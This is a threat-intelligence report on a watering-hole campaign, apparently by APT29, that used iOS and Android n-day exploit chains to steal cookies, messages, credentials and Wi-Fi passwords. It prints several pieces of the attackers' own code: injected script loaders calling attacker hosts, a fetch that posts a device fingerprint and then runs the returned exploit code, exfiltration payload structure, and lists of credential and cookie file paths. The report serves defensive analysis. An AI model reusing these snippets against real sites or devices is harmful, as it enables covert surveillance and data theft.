---
title: "Poisoned Source: APT29 Watering Holes Targets Mobile Devices"
author: Amaury Garçon
url: https://www.sekoia.com/blog/poisoned-source-apt29-watering-holes-targets-mobile-devices-with-n-day-exploits
hostname: sekoia.com
description: Uncover how APT29 launched a massive watering hole campaign using iOS and Android exploit chains to steal sensitive mobile data. Read the full analysis.
sitename: "Poisoned Source: APT29 watering holes target mobile devices with n-day exploits"
date: "2026-11-04"
fingerprint: f59798b300af47e2
---
## Introduction

In mid-October 2026, Sekoia's Threat Detection & Research (TDR) team uncovered a **large-scale watering hole campaign** involving the compromise or the **cloning** of several high-profile websites in the US, Ukraine, Czech Republic, and Bulgaria. In parallel, we assess that the intrusion set carried out a supply-chain compromise of a **Ukrainian web analytics service**, exposing hundreds of legitimate websites and their visitors to its exploit kit for one week.

This campaign relies on three infection vectors: **direct JavaScript injection** on legitimate websites, **Adversary-in-the-Middle-like domains**, and the **supply-chain compromise** of the **Ukrainian web analytics service**. All three infection vectors deliver the same payload, a code injection that loads an external script to profile the visitor’s browser and device. The delivery host then uses the mobile and browser version to serve platform-specific n-day exploit chains without user interaction. One of these chains is **DarkSword**, a suspected Commercial Surveillance Vendor-developed iOS [exploit kit](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain?hl=en) uploaded on [VirusTotal](https://www.virustotal.com/gui/file/493f8d0a9f0f89c51f74d5f1b5592871bf974b16035e43d202ea91ff12e5dfd4/) in September 2026. The final payloads **exfiltrate cookies** or **full device data** from iOS devices, and **Chrome data** and **Wi-Fi passwords** from Android devices, without establishing persistence.

Based on technical overlaps and observed operational patterns, we assess with moderate to high confidence that **this campaign was conducted by APT29** (also tracked as Midnight Blizzard, Cozy Bear, or The Dukes), a Russian nexus intrusion set widely attributed to the **Foreign Intelligence Service of the Russian Federation** (SVR).

We are coordinating with the CERTs of affected countries to support victim identification and assess options for disrupting the watering hole infrastructure.

This report outlines our technical investigation of this campaign, detailing the delivery pipeline, victim profiling logic, and associated infrastructure.

## Infection vectors

Our investigation began with the detection of a malicious Javascript inclusion leading to an attacker-controlled exploit delivery server at the top of a Ukrainian gas production company.

Following the initial detection, we identified additional watering hole campaigns involving both **compromised legitimate websites** and attacker-controlled domains. When the intrusion set were unable to compromise a legitimate website directly, they adopted an **Adversary-in-the-Middle (AiTM)-like approach**, registering lookalike domains and modifying their HTML content on-the-fly to inject malicious JavaScript at the bottom of each page.

Then, as our investigation progressed, we observed requests to the exploit delivery server originating from numerous websites, including some with no apparent strategic relevance to the intrusion set's targeting objectives. Further analysis of these seemingly unrelated websites revealed a common denominator: the Plerdy SEO Tracker, **a third-party component that had been compromised** by the intrusion set for one week.

This section details the different infection vectors employed by the intrusion set to redirect targeted users to the exploit delivery server.

### Legitimate websites compromise

The infection chain on the Ukrainian gas production company started with a **JavaScript injection inside the website's main template**. Once the page and its dependencies finish loading, the script dynamically injects a new element to load an external file, dubbed by the intrusion set the *UltimateFingerprinter* script, hosted on `static.flux-telemetry[.]com` and resolved by `109.104.106[.]107` (`AS395092`).

A beautified version of the injected script is shown below:

```
<script>
    window.onload = function () {
        const script = document.createElement('script'); 
        script.src = 'hxxps://static.flux-telemetry[.]com/module/5b4c8fea5cbcee273e8d830f52-temfp.js'; 
        document.body.appendChild(script);
    }
</script>
```
Several other websites were identified as **compromised** during our investigation, including those of a major industry trade association representing US companies operating in the chemical industry and a far-right European political party.

On several other websites, the intrusion set did not modify the page template but instead appended the malicious code to an existing legitimate JavaScript file. For instance, on a **Bulgarian military-related website**, the intrusion set tampered with an existing JavaScript library to inject the same malicious code.

Lastly, the strategic value of some of the compromised websites remains unclear. We assess with low confidence that these websites may have been compromised to target specific individuals rather than as part of a broader strategic targeting effort.

### AiTM-ish approach

We identified two high-profile websites set up by the intrusion set to act as reverse proxies: a kind of **Adversary-in-the-Middle (AiTM)** between a visitor and the real and legitimate website, patching on the fly the HTML source code to inject a malicious Javascript inclusion at the bottom of the webpage.

The first website, `america250[.]holiday`, acts as a reverse proxy to `america250.org`, which is protected by Cloudflare. `America250.org` is the official website of **America250, the national initiative commemorating the 250th anniversary of American independence**.

We assess that the intrusion set may have deliberately selected this website due to its association with a high-profile national celebration, potentially leveraging the event as a pretext for **invitation-themed spear-phishing** campaigns.

The second website, `theowo[.]club`, now offline, acted as a reverse proxy for the website of **Raffles London at The OWO**, a prestigious luxury hotel housed in the historic Old War Office building.

The hotel's location is particularly noteworthy because of its proximity to **some of the United Kingdom's most sensitive government institutions**, including the Ministry of Defence and 10 Downing Street, the official residence and office of the British Prime Minister.

By doing this watering hole impersonning the Raffles London at The OWO, the intrusion set may have sought to **target diplomatic delegations** and **high-profile guests** through targeted spear-phishing campaigns. Recent open-source reporting, for example, indicates that **Ukrainian President Volodymyr Zelensky** stayed at Raffles London during a visit on 14 October.

The following websites were identified as using an AiTM approach during our investigation:

### Large-scale watering hole via Plerdy SEO Tracker

Between 27 August and 3 September 2026, the intrusion set compromised the Ukrainian **Plerdy analytics tracker hosted under the domain** `a.plerdy[.]com`, which is loaded by thousands of websites, the large majority of them Ukrainian.

It remains unclear whether the attackers intended to target visitors to specific websites or sought to compromise as many unpatched mobile devices as possible, indiscriminately exfiltrating data before selectively identifying and exploiting information of interest.

However, several of these sites are likely to attract high-value or strategically important visitors in the context of the Russia-Ukraine war. This supply chain attack spread through high value targets, such as army, special force and military equipment (ballistic, UAV) websites.

During this one-week campaign, **the intrusion set injected a malicious code** into the legitimate `hxxps://a.plerdy[.]com/public/js/click/main.js` tracker file, causing visitors to load both the legitimate Plerdy script and the intrusion set’s fingerprinting script. The deobfuscated version of the injected code is shown below:

```
window.onload = function () {
  const _0x3af331 = document.createElement("script");
  _0x3af331.src = "hxxps://edge-ord.clouds-stacks[.]com/module/5b4c8fea5cbcee273e8d830f52-temfp.js";
  document.body.appendChild(_0x3af331);
};
```
We were unable to retrieve the script accessible on `edge-ord.clouds-stacks[.]com`, because it was offline. However, its filename (`5b4c8fea5cbcee273e8d830f52-temfp.js`) is identical to that of the script retrieved from the Ukrainian gas production company. On that basis, **we assess with moderate-to-high confidence that it is the same fingerprinting script** that was used during this large-scale watering hole attack.

It is worth noting that `edge-ord.clouds-stacks[.]com` did not host the final fingerprinting script named **UltimateFingerprinter** by the intrusion set. Instead, it redirected requests to other delivery servers (such as `ads-it-assets[.]com`, `cdn.adv-static[.]com`, `wpvortex-mod[.]com` and `assets-int[.]com`) via HTTP-based redirection.

We assess with moderate confidence that the intrusion set used this domain as a **load balancer**, distributing traffic across its delivery infrastructure to mitigate potential outages caused by HTTP requests volume.

### Fingerprinting script (UltimateFingerprinter)

The **UltimateFingerprinter** script is a custom-built JavaScript payload. It is designed to **retrieve the user's operating system and browser version** to **deliver the corresponding exploits** and **collect a detailed user device fingerprint**. Although its name `5b4c8fea5cbcee273e8d830f52-temfp.js` appears to be randomly generated, it is common among all the victims we have observed.

The script is appended to a **minified version of the AngularJS library**, which serves as dead code and accounts for approximately 98% of the file's total size (2.3 MB). We believe this technique serves two potential purposes: hindering automated analysis by large language models (LLMs) by **exceeding their context window,** or to make the malicious script appear legitimate by embedding it within a well-known JavaScript library.

The UltimateFingerprinter is designed to exfiltrate the visitor's browser and device configuration from **61 distinct collectors** that together build **394 fields in JSON**. Here are some examples of fields collected:

- **Classic device fields**: `canvas`, `audio`, `webgl`, `fonts`, `css`, `math`, `screen`
- **Sandbox checks**: `webrtc`, `mediaDevices`, `battery`, `sensors`, `network` and `performance` timing
- **Apple specific**: `iosFeatures`, `macFeatures`, `safariExtensions` and `touchGestures`
- **Modern Web-API**: USB, NFC, Bluetooth, IDLE detection, compute pressure, shape detection, payment

The collected values are then packaged into a **JSON object** and transmitted to a second URL containing a random nonce (bolded is the following JS snippet). This endpoint returns **JavaScript exploit code for execution** if the submitted data meets the attacker's criteria for targeting and exploiting the victim, as shown below.

```
(async function(){
    const adfp = await collectAndDisplayFingerprint();
    let res = await fetch('https://static.flux-telemetry.com/api/uGmlx2pmMHU1jq7wZU2QWgeC28vbXalf/v1', {method: 'POST', headers: { 'Content-Type': 'application/json'}, body: JSON.stringify(adfp)});
    try {   
        const script = document.createElement("script");
        script.text = await res.text();
        document.head.appendChild(script);
    }
    catch{};
})();
```
Despite all the fields collected, the fingerprint has almost no effect on exploitation delivery. The only exception is a basic check on the device configuration. These **three fields can block delivery** if their values are implausible: `screen width` and `screen height` (non–phone sized dimensions like 99999), and `navigator.maxTouchPoints` set to `0` (a non-touch device). In these cases, the delivery host returns a 200 OK with an empty response and serves no payload at all.

The purpose of collecting this extensive fingerprint remains unclear. Although it provides detailed technical information about the visitor’s device, we observed no evidence that this data influenced exploit delivery or was reused later in the infection chain.

## Exploits analysis

During the investigation, we tested different browser profiles against the fingerprinting endpoint at `static[.]flux-telemetry[.]com` in order to retrieve the exploits served to visitors. This allowed us to retrieve three complete exploit chains (afternamed A, B and C), along with their final payloads, targeting both Android and iOS. Here is a summary of what we found:

All three exploit chains rely entirely on known, **already-patched vulnerabilities**. None of them contain zero-days or work against fully updated devices. Each flaw was resolved by the respective vendor before this campaign began. This operation targets unpatched devices using n-days; a user running an up-to-date operating system is safe from these attacks.

### Class A, steals iOS cookies

For iOS 16.7 (even if the chain should work from 16.0 to 17.4), the server delivers a single JavaScript file containing the exploitation code and the final payload. Before anything else the script sets a marker cookie, `VDGH_TOKEN_REF`, with always the same hardcoded value, and bails if it already exists. It is a replay guard that keeps the exploit from firing twice on the same victim. For some reason, they wrote “`days=1`” for the expiration of the cookie, but the calculation is wrong and they end up expiring in 1 minute instead. So only very fast re-infection is prevented. This scenario chains two zero-click CVE exploits to gain enough access on the target devices to execute a JavaScript code used to steal cookies.

#### Stage 1: initial RCE DarkSword CVE-2025-43529

The sample leverages the same RCE ([CVE-2025-43529](https://nvd.nist.gov/vuln/detail/cve-2025-43529)) as the one available in the [DarkSword leaked exploit kit](https://www.virustotal.com/gui/file/493f8d0a9f0f89c51f74d5f1b5592871bf974b16035e43d202ea91ff12e5dfd4), but reimplemented. Two other exploits: an `AccessCase` UAF ([CVE-2024-27808](https://nvd.nist.gov/vuln/detail/cve-2024-27808)) and an SBFX overflow ([CVE-2024-27833](https://nvd.nist.gov/vuln/detail/cve-2024-27833)) remain in the file as dead, unreachable code, probably from an earlier version of the kit.

#### Stage 2: PAC bypass (CVE-2024-27834)

Achieving arbitrary read/write access within the renderer is no longer sufficient for full exploitation on modern Apple silicon. This architecture relies on Pointer Authentication Codes (PAC) to cryptographically sign control-flow pointers. Because of this, even if an attacker can manipulate memory, they cannot simply overwrite a function pointer to hijack the execution flow, triggering an improperly signed pointer will crash the process rather than execute the payload. To overcome this mitigation and forge the valid pointers required for arbitrary code execution, the exploit chain incorporates a PAC bypass utilizing [CVE-2024-27834](https://nvd.nist.gov/vuln/detail/cve-2024-27834).

#### Stage 3: Cookie theft

Two JavaScript execute this process:

- `ASDhdhashdasads()` (the PID sweep): for each pid it calls `invoke(sandbox_container_path_for_pid, pid, buf, 4096)` and lets the kernel write the container path into a heap buffer it controls.
- `AHSDhdashashs()` (the collector): for each resolved container path it calls `invoke(fopen, pathptr, “rb”)`, then `invoke(read, fd, buf, …)`, checks if the magic is “`cook`”, reads the file into a buffer, then pulls the bytes back out of that buffer with the exploit’s own read primitives (readp64/read32) and reassembles them into a JS string.

This method should be able to steal cookies outside of Safari, as long as the applications are running and storing the cookie in: `/private/var/mobile/Containers/Data/Application/<UUID>/Library/Cookies/Cookies.binarycookies.`

The exfiltration is also plain JS: `print()` builds the only\_cookies JSON.

```
  bodyj = {
        "category": "only_cookies",      
        "data": msg,                     // ← the actual stolen data
        "description": "only_cookies",   
        "deviceUUID": genUUID(),
        "path": "only_cookies",          
        "size": 2097152
   }
```
Finally, a `fetch()` POST it to `ad.starx-net[.]com:8881/telemetry/v12`.

### Class B, full data exfiltration

Once the fingerprint gate is passed and the fingerprint is accepted, it will proceed to download multiple stages from `hxxps://ad.starx-net[.]com/api/<NONCE>/v1`, then `/v2` and `/v3`.

This full exploit chain is DarkSword. We based our comparison with this [DarkSword kit](https://www.virustotal.com/gui/file/493f8d0a9f0f89c51f74d5f1b5592871bf974b16035e43d202ea91ff12e5dfd4) and the [Ciolino analysis](https://github.com/AntonioCiolino/DarkSword-Analysis).

#### Stage 1: `/v1` Initial RCE

It starts with the exact same cookie `VDGH_TOKEN_REF` from Class A to prevent additional infection, with the same day/minute confusion as in the previous chain. Then it uses the WebContent RCE [CVE-2025-43529](https://nvd.nist.gov/vuln/detail/cve-2025-43529) followed by [CVE-2026-20700](https://nvd.nist.gov/vuln/detail/cve-2026-20700) as PAC bypass.

#### Stage 2: `/v2` SANDBOX\_ESCAPE

In modern WebKit architecture, the rendering process operates within a restricted sandbox that limits direct access to system resources, the filesystem, and sensitive user data. Therefore, achieving Remote Code Execution (RCE) in the renderer alone is insufficient for full device compromise or comprehensive data collection. A sandbox escape vulnerability must be exploited to break out of this isolated environment, elevate privileges, and gain access to the underlying system IPC mechanisms or kernel interfaces.

In this stage, the exploit chain leverages [CVE-2025-14174](https://nvd.nist.gov/vuln/detail/cve-2025-14174) (`sbx0`) followed by [CVE-2025-43510](https://nvd.nist.gov/vuln/detail/cve-2025-43510) (`sbx1`), with their implementation nearly identical to the mentioned DarkSword kit available on VirusTotal.

#### Stage 3: `/v3` Privilege escalation + post-exploitation

The chain leverages [CVE-2025-43520](https://nvd.nist.gov/vuln/detail/cve-2025-43520) to achieve kernel read/write capabilities, mirroring Stage 2 of the Ciolino writeup.  Once these privileges are secured, a post-exploitation harvester is deployed to exfiltrate data to `ad.starx-net[.]com`. The kit also offers [CVE-2025-31277](https://nvd.nist.gov/vuln/detail/cve-2025-31277) as an alternate initial-entry and [CVE-2025-24201](https://nvd.nist.gov/vuln/detail/cve-2025-24201) as an alternate escape; neither is used in this delivery.

The post exploitation payload is effectively harvesting the phone. First, it takes the native messaging stores: SMS and iMessage from `sms.db`, the Mail indexes (Envelope Index and Protected Index), and Voicemail. Then, it goes after the big third-party messengers, downloading the WhatsApp and Telegram databases. Finally, from the Keychain it pulls stored passwords and tokens, and it grabs account credentials from `Accounts3.sqlite` and Wi-Fi PSKs from `wifi_passwords.txt`.

Beyond  message content it sweeps the communications metadata: contacts, call history, Calendar and Notes, Safari’s `History.db` and cookies (`Cookies.binarycookies` and `/var/mobile/Cookies/`), which is the one and only place its targeting overlaps with the iOS 16 chain. It also reaches into Apple’s own on-device intelligence: app/usage timeline, the routined and `locationd` location caches, Health. Finally it takes media: the photo library (Media/DCIM and PhotoData) and iCloud Drive.

Exfiltrated data is sent to `hxxps://ad.starx-net[.]com:8881/telemetry/v12`, utilizing the exact same endpoint as the Class A chain.

### Class C, steals Android chrome cookies and saved Wi-Fi

This chain targets Android devices running unpatched versions of Chrome. The delivery server selectively serves the exploit to Chrome versions 139.0.0.0 through 145.0.0, explicitly excluding versions 143 for reasons that remain unclear. The payloads served to versions 139 to 144 and to version 145 are identical, except for the shellcode of the GPU exploit, which seems to have been recompiled. Ultimately, both payload variants leverage the same CVE and deliver the same final payload.

#### Stage 1: Initial RCE

The android exploitation chain does not implement the same cookie verification method, nothing prevents two infections in a row. The script directly starts by exploiting the [CVE-2026-3910](https://nvd.nist.gov/vuln/detail/cve-2026-3910) to achieve code execution in the Chrome renderer process.

#### Stage 2: Sandbox escape and privilege escalation

The previous RCE is used to load a shellcode. It is composed of a small loader, a stager, and a shared library that will exploit [CVE-2025-27038](https://nvd.nist.gov/vuln/detail/cve-2025-27038) in the Adreno driver to escape the browser sandbox and enable launching another shellcode with higher privilege. In the exploit there is a check for the device, if SM-S938B is detected (Samsung Galaxy S25 Ultra) the exploitation stops.

#### Stage 3: AndroSnitch

The AndroSnitch shellcode has the same stager and loader as the previous one, the difference lies in the contained shared library. Its internal name is libexploit.so, and has only 16 functions. The only purpose of it is to collect Chrome data and Wi-Fi passwords:

- `/data/data/com.android.chrome/app_chrome/Default/Cookies`
- `/data/data/com.android.chrome/app_chrome/Default/Login Data`
- `/data/data/com.android.chrome/app_chrome/Default/History`
- `/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml`
- `/data/misc/apns/0/WifiConfigStore.xml`

Once collected, it builds 2 headers; `Filename` with value from the previous list of collected SSfiles, and `X-Device-Id` which is hardcoded in the sample. It then proceeds to send these to yet again `hxxps://ad.starx-net[.]com:8881/telemetry/v12` using libcurl.

We dubbed this **AndroSnitch** because of the similarity with the [2024 Google TAG report](https://blog.google/threat-analysis-group/state-backed-attackers-and-commercial-surveillance-vendors-repeatedly-use-the-same-exploits/). They are both targeting the same files but the `WifiConfigStore` in AndroSnitch replaces the `TrustTokens` from AndroSnatch. The `.comment` section indicates the same toolchain for both : Clang/LLD 14.0.7, but this is highly forgeable. They both use libcurl for exfiltration and have a hardcoded token. All those similarities could indicate lineage, but the sample and capabilities are too small to be definitive on that.

## Attribution hypothesis: Tracing the campaign back to APT29

During our investigation, we worked with the CERTs of the countries whose websites were affected by this watering hole campaign. Interestingly, they told us that the backend files of one website compromised (not through the third-party Plerdy service) showed traces of a separate malicious activity. According to a partner, these traces match a private report including TTPs and IOCs of a 2025 **watering hole campaign that has been attributed to APT29**. One of the IOCs of this separate activity is no longer active, even though the website files are still injected with it. We therefore assess two scenarios: either the operator did not remove the artifacts left over from the earlier campaign, or the operator injected leftover malicious components from that campaign by mistake when compromising the website.

While analyzing the exploit chain, we also shared some of our findings with Google TAG. They confirm the framework used in this campaign is similar to a 2024 watering hole campaign where APT29 conducted a [watering hole campaign](https://blog.google/threat-analysis-group/state-backed-attackers-and-commercial-surveillance-vendors-repeatedly-use-the-same-exploits/) against Mongolian government websites. Both campaigns had the same goal: **cookie theft**. However, the 2024 campaign used a hardcoded filter that targeted specific websites. Our campaign has no such filter and collects any cookies from the browser, and for some exploits, the full device data.

According to Google TAG, the exploits in 2024 are the same ones used by [Commercial Surveillance Vendors](https://www.sekoia.com/blog/predators-for-hire-a-global-overview-of-commercial-surveillance-vendors) (CSVs) such as NSO Group or Intellexa. In their report, Google TAG stated that it is uncertain how APT29 acquired these exploits. Our analysis of the exploit chain supports the idea that the exploits came from a third party. For example, the delivery host for the Class A payload only filters for iOS 16.7 / 16.7.10. However, the exploits work across a wider range, from version 16.0 to 17.4. Such a mismatch could indicate that the operators reuse the exploits without changing this part to fit their current delivery chain.

Beyond these technical overlaps, the victimology also supports this assessment. The victims are spread across Europe and the US, with a particular focus on Ukraine, which is consistent with Russian interests. On the other hand, the adversary-controlled domains are distributed across multiple hosters, a pattern previously observed in infrastructure linked to APT29, including its past use of Cobalt Strike's Cs2modrewrite. Finally, we observed the compromise of a far right Czech movement website that matches the intrusion set's history of [targeting European political parties](https://cloud.google.com/blog/topics/threat-intelligence/apt29-wineloader-german-political-parties?hl=en).

**These elements lead us to assess with moderate to high confidence that the intrusion set behind this watering hole campaign is APT29, or at least one of its subgroups.**

## Conclusion

This watering hole campaign, which we assess with **moderate to high confidence to be linked to APT29**, combines multiple web delivery vectors with n-day mobile exploit chains targeting Android and iOS devices.

Across the directly compromised websites, no single sectoral targeting pattern emerges from our analysis. While the victimology shows a **focus on Ukraine and the United States**, the inclusion of unrelated entities such as an **Australian** medical clinic complicates a broad strategic interpretation.

However, we assess that these websites may have been selected **to profile and infect specific individuals** of interest based on targeting intelligence to which we do not have visibility. The operators adapted by deploying Adversary-in-the-Middle-ish to intercept visitors **associated with diplomatic or high-profile events**.

In parallel, the one-week compromise of the Ukrainian analytics service Plerdy between 27 August 2026 and 3 September 2026 **significantly expanded the victimology of the campaign** across thousands of predominantly Ukrainian websites. Several websites using this tracker are directly linked to the **defense sector and military recruitment in Ukraine**. We assess that the intrusion-set may have compromised this third-party provider as an alternative delivery vector after failing to achieve direct JavaScript injection on specific high-value Ukrainian targets that relied on the Plerdy script, but it could also have been deployed as a larger net to fish for interesting credentials.

This operation also confirms the **continued reuse of CSV mobile exploit frameworks**, such as **DarkSword**, by state-sponsored intrusion sets. The adoption of packaged n-day exploit chains lowers the cost and technical threshold required to conduct advanced mobile exploitation. Over the long term, we assess that the proliferation and reuse of CSV exploits among state-sponsored intrusion sets will likely become more frequent.

The TDR team will continue to **track watering hole infrastructure** through our internal monitoring tooling. These ongoing efforts allow us to **identify emerging campaigns** early and document the evolving TTPs of state-sponsored intrusion-sets.

Finally, we would like to thank CERT-UA for collaboration and insights during this investigation, and Google TAG for its assistance in identifying the exploits and the associated CVEs.

## IOCs

*Several indicators, including delivery hosts, exfiltration hosts, YARA rules and details of compromised websites are not shared in this report and are available in the Sekoia CTI. If you are a national CERT or LEA, we can share IOCs and samples with you under TLP:AMBER classification. Please contact tdr \[ at \] sekoia \[ dot \] com.*
